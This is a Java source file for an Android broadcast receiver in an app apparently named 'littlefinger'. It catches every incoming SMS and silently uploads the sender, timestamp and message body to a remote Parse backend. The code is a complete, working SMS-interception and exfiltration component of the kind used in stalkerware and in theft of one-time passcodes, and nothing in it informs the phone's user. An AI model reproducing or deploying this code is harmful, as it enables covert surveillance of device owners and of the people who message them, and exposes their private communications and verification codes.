package com.n42corp.littlefinger;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.parse.ParseObject;

import java.util.Date;

public class BaelishSMSReceiver extends BroadcastReceiver {
    static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";

    public BaelishSMSReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(ACTION)) {
            Bundle bundle = intent.getExtras();

            if (bundle == null) {
                return;
            }

            Object[] pdusObj = (Object[]) bundle.get("pdus");
            if (pdusObj == null) {
                return;
            }

            SmsMessage[] smsMessages = new SmsMessage[pdusObj.length];
            for (int i = 0; i < pdusObj.length; i++) {
                SmsMessage message = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                smsMessages[i] = message;
                this.sendMessageToParse(message);
            }
        }
    }

    private void sendMessageToParse(SmsMessage message) {
        ParseObject messageObj = new ParseObject("Message");
        messageObj.put("sender", message.getDisplayOriginatingAddress());
        messageObj.put("receivedAt", new Date(message.getTimestampMillis()));
        messageObj.put("body", message.getDisplayMessageBody());
        messageObj.saveInBackground();
    }
}
